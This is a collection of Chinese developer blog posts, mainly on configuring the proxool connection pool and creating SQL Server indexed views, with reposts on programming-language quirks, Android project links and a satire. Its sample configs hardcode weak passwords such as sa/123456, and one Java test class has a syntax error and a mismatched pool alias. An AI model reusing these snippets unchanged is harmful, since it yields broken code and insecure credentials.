15:52:00,924 WARN sqlserver:149 - #0003 was active for 306554 milliseconds and has been removed automaticaly. The Thread responsible was named 'http-80-28', bu t the last SQL it performed is unknown because the trace property is not enabled .
 
然后就会关闭连接数据库的Connection, 导致程序出现Socket Close异常. 后来查阅了官方以及网络上, 终于找到了解决的方法. 
产生如上警告的原因是:proxool中有一个参数maximum-active-time 缺省为 5 分钟, 其含义是一个线程持有一个连接的最长时间，而不管这个连接是否处于 active 状态, 并且如果线程的持有时间超过这个时间的之后会自动清除掉这个连接. 但是很多时候5分钟并不够用, 所以需要在配置文件中进行设置, 其单位为毫秒(ms).
参考资料:Proxool Propertieshttp://proxool.sourceforge.net/properties.html用 proxool 需要注意的一个问题http://blogsite.3322.org/jspwiki/pages/viewblog?id=1056c3p0 & proxoolhttp://www.52blog.net/user1/580/archives/2005/235827.shtml
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
sqlserver 2008 视图 索引创建, wmswu.iteye.com.blog.1387756, Tue, 31 Jan 2012 16:46:52 +0800
标题: Microsoft SQL Server Management Studio
------------------------------
创建 对于 索引“ddd”失败。  (Microsoft.SqlServer.Smo)
有关帮助信息，请单击: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&ProdVer=10.50.1600.1+((KJ_RTM).100402-1540+)&EvtSrc=Microsoft.SqlServer.Management.Smo.ExceptionTemplates.FailedOperationExceptionText&EvtID=创建+Index&LinkId=20476
------------------------------
其他信息:
执行 Transact-SQL 语句或批处理时发生了异常。 (Microsoft.SqlServer.ConnectionInfo)
------------------------------
无法对视图 'visit_channel_doc' 创建 索引，因为该视图未绑定到架构。 (Microsoft SQL Server，错误: 1939)
有关帮助信息，请单击: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&ProdVer=10.50.1600&EvtSrc=MSSQLServer&EvtID=1939&LinkId=20476
 
 
      sqlserver 2008 视图索引创建 在设计视图创建的话 默认 绑定到架构为否，TOP规范为是，这样再创建视图索引时就会出现视图未绑定到架构的错误信息，所以要在属性窗口改下 绑定到架构为是，TOP规范为否,还有就是count函数要变为COUNT_BIG函数;
 
记着创建唯一聚集索引 好处大大滴(联机丛书上有解说嘿嘿...)
 
视图中的 SELECT 语句不能包含下列 Transact-SQL 语法元素：
指定列的 * 或 table_name.* 语法。必须明确给出列名。
不能在多个视图列中指定用作简单表达式的表列名。如果对列的所有（或除了一个引用之外的所有）引用是复杂表达式的一部分或是函数的一个参数，则可以多次引用该列。例如，下面的 SELECT 列表无效：
 复制代码 
SELECT ColumnA, ColumnB, ColumnA
 
下面的 SELECT 列表有效：
 复制代码 
SELECT SUM(ColumnA) AS SumColA, ColumnA % ColumnB AS ModuloColAColB, COUNT_BIG(*) AS cBig FROM dbo.T1 GROUP BY ModuloColAColB
 
在 GROUP BY 子句中使用的列的表达式或基于聚合结果的表达式。
派生表。
公用表表达式 (CTE)。
行集函数。
UNION、EXCEPT 或 INTERSECT 运算符。
子查询。
外联接或自联接。
TOP 子句。
ORDER BY 子句。
DISTINCT 关键字。
COUNT(*)（允许 COUNT_BIG(*)。）
AVG、MAX、MIN、STDEV、STDEVP、VAR 或 VARP 聚合函数。如果在引用索引视图的查询中指定了 AVG(expression)，则当视图 SELECT 列表中包含 SUM(expression) 和 COUNT_BIG(expression) 时，优化器可经常计算所需结果。例如，索引视图 SELECT 列表不能包含表达式 AVG(column1)。如果视图 SELECT 列表包含表达式 SUM(column1) 和 COUNT_BIG(column1)，则 SQL Server 可以计算引用视图并指定 AVG(column1) 的查询的平均数。
引用可为空表达式的 SUM 函数。
包括排名或聚合开窗函数的 OVER 子句。
CLR 用户定义聚合函数。
全文谓词 CONTAINS 或 FREETEXT。
COMPUTE 或 COMPUTE BY 子句。
CROSS APPLY 或 OUTER APPLY 运算符。
PIVOT 或 UNPIVOT 运算符。
表提示（仅应用于 90 或更高的兼容级别）。
联接提示。
对 Xquery 表达式的直接引用。可以接受间接引用，例如位于绑定到架构的、用户定义的函数内部的 Xquery 表达式。
如果指定了 GROUP BY，则视图选择列表必须包含 COUNT_BIG(*) 表达式，且视图定义不能指定 HAVING、ROLLUP、CUBE 或 GROUPING SETS。
 
详细可参考sqlserver联机丛书中的“创建索引视图 ”内容
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
proxool 配置... 转, wmswu.iteye.com.blog.1323062, Fri, 23 Dec 2011 13:57:02 +0800
1、proxool是一个非常优秀的数据库连接池框架。其常用配置属性如下，其中红体字为必配项，蓝体字为建议配置项，其他非必要可采用默认值。
alias：别名，用于获取数据库连接。
driver-url：数据库访问url。
driver-class：驱动类路径，包括包名
driver-properties：传给驱动的属性，常用的有：user：数据库用户名，password：数据库密码
fatal-sql-exception: 它是一个逗号分割的信息片段.当一个SQL异常发生时,他的异常信息将与这个信息片段进行比较.如果在片段中存在,那么这个异常将被认为是个致命错误(Fatal SQL Exception ).这种情况下,数据库连接将要被放弃.无论发生什么,这个异常将会被重掷以提供给消费者.用户最好自己配置一个不同的异常来抛出.fatal-sql-exception-wrapper-class:正如上面所说,你最好配置一个不同的异常来重掷.利用这个属性,用户可以包装SQLException,使他变成另外一个异常.这个异常或者继承SQLException或者继承字RuntimeException.proxool自带了2个实现:'org.logicalcobwebs.proxool.FatalSQLException' 和'org.logicalcobwebs.proxool.FatalRuntimeException' .后者更合适.house-keeping-sleep-time: house keeper 保留线程处于睡眠状态的最长时间,house keeper 的职责就是检查各个连接的状态,并判断是否需要销毁或者创建.house-keeping-test-sql:  如果发现了空闲的数据库连接.house keeper 将会用这个语句来测试.这个语句最好非常快的被执行.如果没有定义,测试过程将会被忽略(如：select 0)。injectable-connection-interface: 允许proxool实现被代理的connection对象的方法.injectable-statement-interface: 允许proxool实现被代理的Statement 对象方法.injectable-prepared-statement-interface: 允许proxool实现被代理的PreparedStatement 对象方法.injectable-callable-statement-interface: 允许proxool实现被代理的CallableStatement 对象方法.jmx: 略jmx-agent-id: 略jndi-name: 数据源的名称maximum-active-time: 如果housekeeper 检测到某个线程的活动时间大于这个数值.它将会杀掉这个线程.所以确认一下你的服务器的带宽.然后定一个合适的值.默认是5分钟.maximum-connection-count: 最大的数据库连接数.maximum-connection-lifetime: 一个线程的最大寿命.minimum-connection-count: 最小的数据库连接数overload-without-refusal-lifetime: 略prototype-count: 连接池中可用的连接数量.如果当前的连接池中的连接少于这个数值.新的连接将被建立(假设没有超过最大可用数).例如.我们有3个活动连接2个可用连接,而我们的prototype-count是4,那么数据库连接池将试图建立另外2个连接.这和 minimum-connection-count不同. minimum-connection-count把活动的连接也计算在内.prototype-count 是spare connections 的数量.recently-started-threshold:  略simultaneous-build-throttle:  略statistics: 连接池使用状况统计。 参数“10s,1m,1d”statistics-log-level:  日志统计跟踪类型。 参数“ERROR”或 “INFO”test-before-use: 略test-after-use: 略trace: 如果为true,那么每个被执行的SQL语句将会在执行期被log记录(DEBUG LEVEL).你也可以注册一个ConnectionListener (参看ProxoolFacade)得到这些信息.verbose: 详细信息设置。 参数 bool 值
 
部分默认值：
maximum-connection-lifetime   最大连接生命周期 默认值：4小时maximum-active-time：   最大活动时间   默认值：5分钟maximum-connection-count   最大连接数   默认值：15个minimum-connection-count   最小连接数   默认值：5个
 
2、举例(各种数据库的驱动参见附件)：
a、SQL Server2000（或2005）配置：
 
Java代码  
<?xml version="1.0" encoding="UTF-8"?>   
<something-else-entirely>   
    <proxool>   
        <alias>erp</alias>   
        <driver-url>   
            jdbc:jtds:sqlserver://127.0.0.1:1433;DatabaseName=db_test;   
        </driver-url>   
        <driver-class>net.sourceforge.jtds.jdbc.Driver</driver-class>   
        <driver-properties>   
            <property name="user" value="sa" />   
            <property name="password" value="123456" />   
            <property name="autoReconnect" value="true" />   
        </driver-properties>   
        <minimum-connection-count>5</minimum-connection-count>   
        <maximum-connection-count>50</maximum-connection-count>   
        <house-keeping-sleep-time>30</house-keeping-sleep-time>   
          <maximum-active-time>600000</maximum-active-time>        
          <house-keeping-test-sql>select 0</house-keeping-test-sql>   
    </proxool>   
</something-else-entirely>  
<?xml version="1.0" encoding="UTF-8"?>
<something-else-entirely>
	<proxool>
		<alias>erp</alias>
		<driver-url>
			jdbc:jtds:sqlserver://127.0.0.1:1433;DatabaseName=db_test;
		</driver-url>
		<driver-class>net.sourceforge.jtds.jdbc.Driver</driver-class>
		<driver-properties>
			<property name="user" value="sa" />
			<property name="password" value="123456" />
			<property name="autoReconnect" value="true" />
		</driver-properties>
		<minimum-connection-count>5</minimum-connection-count>
		<maximum-connection-count>50</maximum-connection-count>
		<house-keeping-sleep-time>30</house-keeping-sleep-time>
          <maximum-active-time>600000</maximum-active-time>		
          <house-keeping-test-sql>select 0</house-keeping-test-sql>
	</proxool>
</something-else-entirely>
 
 
b、Oracle配置：
 
Java代码  
<?xml version="1.0" encoding="UTF-8"?>   
<something-else-entirely>   
     <proxool>   
        <alias>orc</alias>   
        <driver-url>   
            jdbc:oracle:thin:@192.168.0.1:1521:db_test   
        </driver-url>   
        <driver-class>oracle.jdbc.driver.OracleDriver</driver-class>   
        <driver-properties>   
            <property name="user" value="system" />   
            <property name="password" value="manager" />   
        </driver-properties>   
        <minimum-connection-count>1</minimum-connection-count>   
        <maximum-connection-count>20</maximum-connection-count>   
        <house-keeping-sleep-time>30</house-keeping-sleep-time>   
        <maximum-active-time>600000</maximum-active-time>          
        <house-keeping-test-sql>select 0</house-keeping-test-sql>   
        <trace>false</trace>   
        <statistics-log-level>ERROR</statistics-log-level>   
    </proxool>   
</something-else-entirely>  
<?xml version="1.0" encoding="UTF-8"?>
<something-else-entirely>
     <proxool>
		<alias>orc</alias>
		<driver-url>
			jdbc:oracle:thin:@192.168.0.1:1521:db_test
		</driver-url>
		<driver-class>oracle.jdbc.driver.OracleDriver</driver-class>
		<driver-properties>
			<property name="user" value="system" />
			<property name="password" value="manager" />
		</driver-properties>
		<minimum-connection-count>1</minimum-connection-count>
		<maximum-connection-count>20</maximum-connection-count>
		<house-keeping-sleep-time>30</house-keeping-sleep-time>
        <maximum-active-time>600000</maximum-active-time>		
        <house-keeping-test-sql>select 0</house-keeping-test-sql>
		<trace>false</trace>
		<statistics-log-level>ERROR</statistics-log-level>
	</proxool>
</something-else-entirely>
 
 
c、MySql配置：
 
Java代码  
<?xml version="1.0" encoding="UTF-8"?>   
<something-else-entirely>   
<proxool>   
        <alias>erp</alias>   
        <driver-url>   
            jdbc:mysql://192.168.0.1:3306/db_test?useUnicode=true&amp;characterEncoding=UTF8   
        </driver-url>   
        <driver-class>com.mysql.jdbc.Driver</driver-class>   
        <driver-properties>   
            <property name="user" value="root" />   
            <property name="password" value="root" />   
            <property name="autoReconnect" value="true" />   
        </driver-properties>   
        <minimum-connection-count>5</minimum-connection-count>   
        <maximum-connection-count>50</maximum-connection-count>   
        <house-keeping-sleep-time>30</house-keeping-sleep-time>   
        <house-keeping-test-sql>select 0</house-keeping-test-sql>   
        <maximum-active-time>3600000</maximum-active-time>   
    </proxool>   
</something-else-entirely>  
<?xml version="1.0" encoding="UTF-8"?>
<something-else-entirely>
<proxool>
		<alias>erp</alias>
		<driver-url>
			jdbc:mysql://192.168.0.1:3306/db_test?useUnicode=true&amp;characterEncoding=UTF8
		</driver-url>
		<driver-class>com.mysql.jdbc.Driver</driver-class>
		<driver-properties>
			<property name="user" value="root" />
			<property name="password" value="root" />
			<property name="autoReconnect" value="true" />
		</driver-properties>
		<minimum-connection-count>5</minimum-connection-count>
		<maximum-connection-count>50</maximum-connection-count>
		<house-keeping-sleep-time>30</house-keeping-sleep-time>
		<house-keeping-test-sql>select 0</house-keeping-test-sql>
		<maximum-active-time>3600000</maximum-active-time>
	</proxool>
</something-else-entirely>
  
 
d、Sybase配置：
 
Java代码  
<?xml version="1.0" encoding="UTF-8"?>   
<something-else-entirely>   
<proxool>   
    <alias>db_test</alias>   
    <driver-url>jdbc:sybase:Tds:192.168.0.1:5000/db_test?charset=cp936</driver-url><!--防止乱码，在sybase中编码通常采用cp850或者cp936-->   
    <driver-class>com.sybase.jdbc3.jdbc.SybDriver</driver-class>   
    <driver-properties>   
      <property name="user" value="sa"/>   
      <property name="password" value="123456"/>   
    </driver-properties>   
    <minimum-connection-count>10</minimum-connection-count>   
    <maximum-connection-count>20</maximum-connection-count>   
    <house-keeping-sleep-time>40000</house-keeping-sleep-time>   
    <maximum-active-time>900000</maximum-active-time>   
    <house-keeping-test-sql>select 0</house-keeping-test-sql>   
 </proxool>   
</something-else-entirely>  
<?xml version="1.0" encoding="UTF-8"?>
<something-else-entirely>
<proxool>
    <alias>db_test</alias>
    <driver-url>jdbc:sybase:Tds:192.168.0.1:5000/db_test?charset=cp936</driver-url><!--防止乱码，在sybase中编码通常采用cp850或者cp936-->
    <driver-class>com.sybase.jdbc3.jdbc.SybDriver</driver-class>
    <driver-properties>
      <property name="user" value="sa"/>
      <property name="password" value="123456"/>
    </driver-properties>
    <minimum-connection-count>10</minimum-connection-count>
    <maximum-connection-count>20</maximum-connection-count>
    <house-keeping-sleep-time>40000</house-keeping-sleep-time>
    <maximum-active-time>900000</maximum-active-time>
    <house-keeping-test-sql>select 0</house-keeping-test-sql>
 </proxool>
</something-else-entirely>
 
 
3、具体使用
a、对于proxool使用在J2EE的web项目中，可以配置到web.xml文件中使用，具体配置使用步骤网上一搜一大堆，这里不细说。
 
b、proxool用在各种J2EE框架中，如Spring、Hibernate等，可以自己网上找，相关介绍很多，这里也不细讲。
 
c、自己加载解析使用(假如数据库配置文件名为dbconfig.xml，数据库连接配置的别名为db_test)，首先写一个解析、管理配置文件和数据库连接的类如下：
 
Java代码  
/**  
 * 数据库连接管理器  
 *   
 * @author 蜘蛛  
 *  
 */  
public class DBConnector {   
       
    /**默认数据库连接配置文件名称*/  
    private static String dbConfig = "dbconfig.xml";   
  
    public DBConnector() {   
  
    }   
  
    public DBConnector(String dbConfigMas) {   
        dbConfig = dbConfigMas;   
    }   
  
    /**  
     * 初始化  
     *   
     * @return  
     */  
    public boolean init() {   
        try {   
            JAXPConfigurator.configure(dbConfig, false);   
            return true;   
        } catch (ProxoolException ex) {   
            ex.printStackTrace();   
        }   
        return false;   
    }   
  
    /**  
     * 获取数据库连接  
     *   
     * @return  
     */  
    public static Connection getConn() {   
           
        Connection temp = null;   
        try {   
            temp = DriverManager.getConnection("proxool.db_test");   
        } catch (SQLException e) {   
            e.printStackTrace();   
            try {   
                JAXPConfigurator.configure(dbConfig, false);   
                temp = DriverManager.getConnection("proxool.mas");   
            } catch (ProxoolException ex) {   
                ex.printStackTrace();   
            } catch (SQLException sqlE) {    
                sqlE.printStackTrace();   
            }   
        }   
        return temp;   
    }   
       
    /**  
     * 关闭数据库连接，释放数据库连接  
     *   
     * @param rs  
     * @param pstmt  
     * @param con  
     */  
    public static void close(ResultSet rs, PreparedStatement pstmt, Connection con) {   
        if(null != rs) {   
            try {   
                rs.close();   
            } catch (SQLException e) {   
                e.printStackTrace();   
            }   
        }   
        if (null != pstmt) {   
            try {   
                pstmt.close();   
            } catch (SQLException e) {   
                e.printStackTrace();   
            }   
        }   
        if (null != con) {   
            try {   
                con.close();   
            } catch (SQLException e) {   
                e.printStackTrace();   
            }   
        }   
    }   
}  
/**
 * 数据库连接管理器
 * 
 * @author 蜘蛛
 *
 */
public class DBConnector {
	
	/**默认数据库连接配置文件名称*/
    private static String dbConfig = "dbconfig.xml";
    public DBConnector() {
    }
    public DBConnector(String dbConfigMas) {
        dbConfig = dbConfigMas;
    }
    /**
     * 初始化
     * 
     * @return
     */
    public boolean init() {
        try {
            JAXPConfigurator.configure(dbConfig, false);
            return true;
        } catch (ProxoolException ex) {
            ex.printStackTrace();
        }
        return false;
    }
    /**
     * 获取数据库连接
     * 
     * @return
     */
    public static Connection getConn() {
        
    	Connection temp = null;
    	try {
    		temp = DriverManager.getConnection("proxool.db_test");
		} catch (SQLException e) {
			e.printStackTrace();
			try {
				JAXPConfigurator.configure(dbConfig, false);
				temp = DriverManager.getConnection("proxool.mas");
	        } catch (ProxoolException ex) {
	            ex.printStackTrace();
	        } catch (SQLException sqlE) { 
	        	sqlE.printStackTrace();
	        }
		}
		return temp;
    }
    
    /**
     * 关闭数据库连接，释放数据库连接
     * 
     * @param rs
     * @param pstmt
     * @param con
     */
    public static void close(ResultSet rs, PreparedStatement pstmt, Connection con) {
    	if(null != rs) {
			try {
				rs.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
		}
		if (null != pstmt) {
			try {
				pstmt.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
		}
		if (null != con) {
			try {
				con.close();
			} catch (SQLException e) {
				e.printStackTrace();
			}
		}
    }
}
 
 测试类：
 
Java代码  
public class TestProxool{   
  
public static void main(String[]args {   
      DBConnector dbCon = new DBConnector();   
            if(!dbCon.init()){   
               Debuger.log("数据库连接配置加载并初始化失败......");   
               return ;   
            }   
            Debuger.log("数据库连接配置加载并初始化成功......");   
            //只需在程序一开始启动时加载初始化即可，以后直接采用类DBConnector的静态方法getConn获取数据库连接，无需再执行加载初始化操作   
            System.out.println("连接 = " + DBConnector.getConn());   
      }   
  
}  
public class TestProxool{
public static void main(String[]args {
      DBConnector dbCon = new DBConnector();
            if(!dbCon.init()){
               Debuger.log("数据库连接配置加载并初始化失败......");
               return ;
            }
            Debuger.log("数据库连接配置加载并初始化成功......");
            //只需在程序一开始启动时加载初始化即可，以后直接采用类DBConnector的静态方法getConn获取数据库连接，无需再执行加载初始化操作
            System.out.println("连接 = " + DBConnector.getConn());
      }
}
  
 
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
那些令人发狂的程序特性 转, wmswu.iteye.com.blog.1299915, Fri, 09 Dec 2011 14:36:31 +0800

这些最为奇怪的程序语言的特性，来自stackoverflow.com，原贴在这里。我摘选了一些例子，的确是比较怪异，让我们一个一个来看看。
1、C语言中的数组
在C/C++中，a[10] 可以写成 10[a]
“Hello World”[i] 也可以写成 i["Hello World"] 
2、在Javascript中 
 ’5′ + 3 的结果是：’53′
 ’5′ – 3 的结果是：2              更多javascript点击这里
3、C/C++中的Trigraphs 
Cpp代码  
int main() {   
    cout << "LOL??!";   
}  
int main() {
    cout << "LOL??!";
}
 上面的这段程序会输出： “LOL|”，这是因为 ??! 被转成了 | ，关于Trigraphs，下面有个表格：  
??=
#
??(
[
??/
\
??)
]
??’
^
??<
{
??!
|
??>
}
??-
~
4、JavaScript 的条件表 
看到下面这个表，不难理解为什么Javascript程序员为什么痛苦了
Js代码  
''        ==   '0'          //false   
0         ==   ''           //true   
0         ==   '0'          //true   
false     ==   'false'      //false   
false     ==   '0'          //true   
false     ==   undefined    //false   
false     ==   null         //false   
null      ==   undefined    //true   
" \t\r\n" ==   0            //true  
''        ==   '0'          //false
0         ==   ''           //true
0         ==   '0'          //true
false     ==   'false'      //false
false     ==   '0'          //true
false     ==   undefined    //false
false     ==   null         //false
null      ==   undefined    //true
" \t\r\n" ==   0            //true
 
5、Java的Integer cache
Java代码  
Integer foo = 1000;   
Integer bar = 1000;   
  
foo <= bar; // true   
foo >= bar; // true   
foo == bar; // false   
  
//然后，如果你的 foo 和 bar 的值在 127 和 -128 之间（包括）   
//那么，其行为则改变了：   
  
Integer foo = 42;   
Integer bar = 42;   
  
foo <= bar; // true   
foo >= bar; // true   
foo == bar; // true  
Integer foo = 1000;
Integer bar = 1000;
foo <= bar; // true
foo >= bar; // true
foo == bar; // false
//然后，如果你的 foo 和 bar 的值在 127 和 -128 之间（包括）
//那么，其行为则改变了：
Integer foo = 42;
Integer bar = 42;
foo <= bar; // true
foo >= bar; // true
foo == bar; // true
为什么会这样呢？你需要了解一下Java Interger Cache，下面是相关的程序，注意其中的注释
Java代码  
/**  
 
     * Returns a <tt>Integer</tt> instance representing the specified  
 
     * <tt>int</tt> value.  
 
     * If a new <tt>Integer</tt> instance is not required, this method  
 
     * should generally be used in preference to the constructor  
     * <a href="mailto:{@link">{@link</a> #Integer(int)}, as this method is likely to yield  
     * significantly better space and time performance by caching  
     * frequently requested values.  
     *  
     * @param  i an <code>int</code> value.  
     * @return a <tt>Integer</tt> instance representing <tt>i</tt>.  
     * @since  1.5  
     */  
    public static Integer valueOf(int i) {   
        if(i >= -128 && i <= IntegerCache.high)   
            return IntegerCache.cache[i + 128];   
        else  
            return new Integer(i);   
    }  
/**
     * Returns a <tt>Integer</tt> instance representing the specified
     * <tt>int</tt> value.
     * If a new <tt>Integer</tt> instance is not required, this method
     * should generally be used in preference to the constructor
     * <a href="mailto:{@link">{@link</a> #Integer(int)}, as this method is likely to yield
     * significantly better space and time performance by caching
     * frequently requested values.
     *
     * @param  i an <code>int</code> value.
     * @return a <tt>Integer</tt> instance representing <tt>i</tt>.
     * @since  1.5
     */
    public static Integer valueOf(int i) {
        if(i >= -128 && i <= IntegerCache.high)
            return IntegerCache.cache[i + 128];
        else
            return new Integer(i);
    }
5、Perl的那些奇怪的变量
Php代码  
$.   
$_  
$_#   
$$   
$[   
@_  
$.
$_
$_#
$$
$[
@_
 其所有的这些怪异的变量请参看：http://www.kichwa.com/quik_ref/spec_variables.html
 
6、Java的异常返回
请看下面这段程序，你觉得其返回true还是false？
Java代码  
try {   
    return true;   
} finally {   
    return false;   
}  
try {
    return true;
} finally {
    return false;
}
 在 javascript 和python下，其行为和Java的是一样的。  
7、C语言中的Duff device
下面的这段程序你能看得懂吗？这就是所谓的Duff Device，相当的怪异。
C代码  
void duff_memcpy( char* to, char* from, size_t count ) {   
    size_t n = (count+7)/8;   
    switch( count%8 ) {   
    case 0: do{ *to++ = *from++;   
    case 7:     *to++ = *from++;   
    case 6:     *to++ = *from++;   
    case 5:     *to++ = *from++;   
    case 4:     *to++ = *from++;   
    case 3:     *to++ = *from++;   
    case 2:     *to++ = *from++;   
    case 1:     *to++ = *from++;   
            }while(--n>0);   
    }   
}   
void duff_memcpy( char* to, char* from, size_t count ) {
    size_t n = (count+7)/8;
    switch( count%8 ) {
    case 0: do{ *to++ = *from++;
    case 7:     *to++ = *from++;
    case 6:     *to++ = *from++;
    case 5:     *to++ = *from++;
    case 4:     *to++ = *from++;
    case 3:     *to++ = *from++;
    case 2:     *to++ = *from++;
    case 1:     *to++ = *from++;
            }while(--n>0);
    }
} 
8、PHP中的字符串当函数用
PHP中的某些用法也是很怪异的
Php代码  
$x = "foo";   
function foo(){ echo "wtf"; }   
$x();  
$x = "foo";
function foo(){ echo "wtf"; }
$x();
9、在C++中，你可以使用空指针调用静态函数
Cpp代码  
class Foo {   
  public:   
    static void bar() {   
      std::cout << "bar()" << std::endl;   
    }   
};  
class Foo {
  public:
    static void bar() {
      std::cout << "bar()" << std::endl;
    }
};
呵呵。的确是挺怪异的。 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
近百android程序源码贡献 转载的自己看的, wmswu.iteye.com.blog.1276713, Thu, 24 Nov 2011 13:55:00 +0800

Android PDF 阅读器 http://sourceforge.net/projects/andpdf/files/个人记账工具 OnMyMeans http://sourceforge.net/projects/onmymeans/developAndroid电池监控 Android Battery Dog http://sourceforge.net/projects/andbatdog/RSS阅读软件 Android RSS http://code.google.com/p/android-rss/Android的PDF阅读器 DroidReader http://code.google.com/p/droidreader/Android Scripting Environment http://code.google.com/p/android-scripting/Android小游戏 Android Shapes http://sourceforge.net/projects/shapes/Android JSON RPC http://code.google.com/p/android-json-rpc/Android VNC http://code.google.com/p/android-vnc/魅族M8的Android移植 M8 Android http://code.google.com/p/m8-android-kernel/Android 游戏 Amazed http://code.google.com/p/apps-for-android/Android的社交网络 HelloWorld goes mobile http://sourceforge.net/projects/helloworldgm/手机聊天程序 Android jChat http://code.google.com/p/jchat4android/Android的GPS轨迹记录 MyTracks http://code.google.com/p/mytracks/Android国际象棋游戏 Honzovy achy http://sourceforge.net/projects/honzovysachy/Android旅行记录软件 AndTripLog http://sourceforge.net/projects/andtriplog/音乐播放器 Ambient http://sourceforge.net/projects/ambientmp/Android的邮件客户端 K9mail http://code.google.com/p/k9mail/多平台应用开发库 QuickConnect http://sourceforge.net/projects/quickconnect/gPhone手机空战游戏 http://code.google.com/p/wireless-apps/Android 照片小软件 Panoramio http://code.google.com/p/apps-for-android/i-jetty http://code.google.com/p/i-jetty/Android 小游戏 DivideAndConquer http://code.google.com/p/apps-for-android/Android 全球时间 AndroidGlobalTime http://code.google.com/p/apps-for-android/Android 2D游戏引擎 Android Angle http://code.google.com/p/angle/Android Ruby http://code.google.com/p/android-ruby/Android-N810 http://sourceforge.net/projects/android-n810/Android的短信应用 Ecclesia http://sourceforge.net/projects/ecclesiaAndroid平台上的JXTA客户端 Peerdroid http://code.google.com/p/peerdroid/Android游戏引擎 libgdx http://code.google.com/p/libgdx/Android 照片小软件 Photostream http://code.google.com/p/apps-for-android/Alien3d logo Android 3D游戏引擎 Alien3d http://code.google.com/p/alien3d/Winamp Remote Android Server http://sourceforge.net/projects/winampdroidAndroid的Facebook客户端 Andrico http://code.google.com/p/andrico/Android Applications Manager http://sourceforge.net/projects/aam/Java 3D图形引擎 Catcake http://code.google.com/p/catcake/android-gcc-objc2-0 http://code.google.com/p/android-gcc-objc2-0/九宫格数独游戏 OpenSudoku http://code.google.com/p/opensudoku-android/Android 铃声扩展工具 RingsExtended http://code.google.com/p/apps-for-android/JavaEye Android client http://code.google.com/p/javaeye-android-client/RemoteDroid http://code.google.com/p/remotedroid/Android 小游戏 Clickin2DaBeat http://code.google.com/p/apps-for-android/中医大夫助理信息系统 zz-doctor http://code.google.com/p/zz-doctor/Facebook Connect for Android http://code.google.com/p/fbconnect-android/Android SMSPopup http://code.google.com/p/android-smspopup/FreeTTS-Android http://sourceforge.net/projects/freettsandroidiFoursquare.com的客户端 Foursquar http://code.google.com/p/foursquared/条形码扫描仪 Android PC_BCR http://code.google.com/p/android-pcbcr/
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
"六一儿童节"唐僧写给悟空的祝贺信（转）, wmswu.iteye.com.blog.1253742, Fri, 11 Nov 2011 14:31:08 +0800
悟空徒儿：那天正在开会，没有接你电话。会场有监控，有些事电话也说不清楚。   回想取经路上的艰难困苦，没有你，为师早被妖怪吃掉变成肥料了。我知道，你是一个有思想、有魄力的人，现在却受了这些委屈。西天取经你确实成绩突出，这些都属于过去了。时代在变，光本事是不够的，我们都要与时俱进啊！　　　　四个徒弟中，白龙马他爹是西海龙王敖刚，标准的“官二代”+“富二代”，取经回来才几天，就被任命为东海常务副市长。上次邀请我去调研，那排场比我这个天宫政协副主-席强多了。八戒和沙僧是下派来挂职锻炼的，不但官复原职，昨天常委会还全票通过了明确为正局级。    你是从石头缝里蹦出来的，没有背景、没有资源，必须自己勤奋努力。不要看不起八戒，为人处世上要向他学习。他现在如鱼得水，上层路线走得好，在女干部中也很有影响力。上次公推优秀年轻干部，你只得了2票，1票是我投的，另1票是你自己投的吧？八戒得票却遥遥领先，据说嫦娥都给他投票了。形势变化太快，为师都感到不适应。老实巴交的沙僧也搞了个流沙河房产公司，别墅都建到月亮上去了。现在他和七仙女同居，跟何仙姑也有一腿，光房子就有几十套。  　　悟空啊，务必要搞好上层人际，消除大闹天宫受过处分的不良影响。你临时负责花果山风景区管委会工作3年多了，为师也帮你协调过，为什么一直没有转正？原因要深入分析。克服你的性格缺陷，别老是火眼金睛的，让人不舒服。还有你这张猴嘴，看不惯的就乱说，必须要改一改！　　现在就你还独身一人，排挤你的人到处造谣说是作风问题。不成家，何以立业？为师觉得白骨精还是不错的，上次人家还说你身上毛多，是标准的男子汉。不要揪住别人的过去不放，该考虑一下了。　　昨天女儿国国王又催问我结婚的事，我想尽快给办了。虽然她没有蜘蛛精性感，也不如玉兔精清纯，可背景过硬，对为师以后交流到主干线帮助很大。如果蜘蛛精和玉兔精愿意，就做个红颜知己吧。　　不说了，说的有点多了，祝光棍节快乐！                                                                                                                            唐  僧  
 
附赠图片：
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
免费下载Aspose.Cells. Demo示例库, wolfscry.iteye.com.blog.2063932, Thu, 08 May 2014 15:31:24 +0800

Aspose.Cells. Demo示例库的这些示例项目为我们使用 Aspose.Cells for .NET提供有用的示范和代码，方便我们学习如何将Aspose.Cells应用到现实的项目或应用程序中。每个示例都分C# 和Visual Basic ，并放置在相应的文件夹中。
示例
描述
QuickStart
这些例子都是针对 Aspose.Cells的快速入门教程.。查看源代码后你就知道在应用中加入Aspose Cells有多简单。
Charts
这类示例展描述了如何创建不同的表格。 使你对一些标准图表类型及其子类型有大致的印象。
SchoolReport Card
这些示例示范用虚构的数据生成一个成绩报告单。
Northwind
这些示例展示了如何应用Aspose.Cells控件创建最为丰富多样的，类似于Microsoft Access Northwind Sample Database那些报告单。
Business Reports
这类示例展示了如何创建类似于微软官网的业务报告模板文件的财务计划和帕累托图成本报告。
Smart Marker
这些示例展示如何使用依靠Smart Marker技术生成的几行代码创建数据报告。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
说说aspose新产品aspose note, wolfscry.iteye.com.blog.2062666, Wed, 07 May 2014 14:29:16 +0800

        Aspose.Note 是一款处理Microsoft Office OneNote文件的类库。它使得开发人员在C#、VB.NET、ASP.NET web、web服务和Windows应用中中处理.one文件。它能够打开文件并操作OneNote元素，从文本、图像和属性到更多复杂元素，然后到处PNG、GIF、JPEG、BMP或PDF格式。
 
